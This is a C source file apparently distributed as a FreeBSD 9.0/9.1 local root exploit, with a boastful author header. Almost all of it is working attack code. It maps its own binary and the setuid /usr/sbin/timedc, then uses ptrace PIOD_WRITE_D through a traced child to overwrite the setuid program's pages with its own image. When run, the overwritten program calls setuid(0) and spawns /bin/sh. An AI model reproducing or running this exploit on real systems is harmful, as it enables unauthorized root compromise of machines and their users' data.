/*
 * FreeBSD 9.{0,1} mmap/ptrace exploit
 * by Hunger <fbsd9lul@hunger.hu>
 *
 * Happy Birthday FreeBSD!
 * Now you are 20 years old and your security is the same as 20 years ago... :)
 *
 * Greetings to #nohup, _2501, boldi, eax, johnny_b, kocka, op, pipacs, prof,
 *              sd, sghctoma, snq, spender, s2crew and others at #hekkcamp:
 *                      I hope we'll meet again at 8@1470n ;)
 *
 * Special thanks to proactivesec.com
 *
 */

#include <err.h>
#include <errno.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/wait.h>

#define SH "/bin/sh"
#define TG "/usr/sbin/timedc"

int
main(int ac, char **av) {
   int from_fd, to_fd, status;
   struct stat st;
   struct ptrace_io_desc piod;
   char *s, *d;
   pid_t pid;

   if (geteuid() == 0)  {
        setuid(0);
        execl(SH, SH, NULL);
        return 0;
   }

   printf("FreeBSD 9.{0,1} mmap/ptrace exploit\n");
   printf("by Hunger <fbsd9lul@hunger.hu>\n");

   if ((from_fd = open(av[0], O_RDONLY)) == -1 ||
        (to_fd = open(TG, O_RDONLY)) == -1)
                err(1, "open");

   if (stat(av[0], &st) == -1)
        err(2, "stat");

   if (((s = mmap(NULL, (size_t)st.st_size, PROT_READ,
        MAP_SHARED, from_fd, (off_t)0)) == MAP_FAILED) ||
                (d = mmap(NULL, (size_t)st.st_size, PROT_READ,
                        MAP_SHARED|MAP_NOSYNC, to_fd, (off_t)0)) == MAP_FAILED)
                                err(3, "mmap");

   if ((pid = fork()) == -1)
        err(4, "fork");

   if (!pid) {
        if (ptrace(PT_TRACE_ME, pid, NULL, 0) == -1)
                err(5, "ptraceme");

        return 0;
        }

   if (ptrace(PT_ATTACH, pid, NULL, 0) == -1)
        err(6, "ptattach");

   if (wait(&status) == -1)
        err(7, "wait");

   piod.piod_op = PIOD_WRITE_D;
   piod.piod_offs = d;
   piod.piod_addr = s;
   piod.piod_len  = st.st_size;

   if (ptrace(PT_IO, pid, (caddr_t)&piod, 0) == -1)
        err(8, "ptio");

   execl(TG, TG, NULL);

   return 0;
}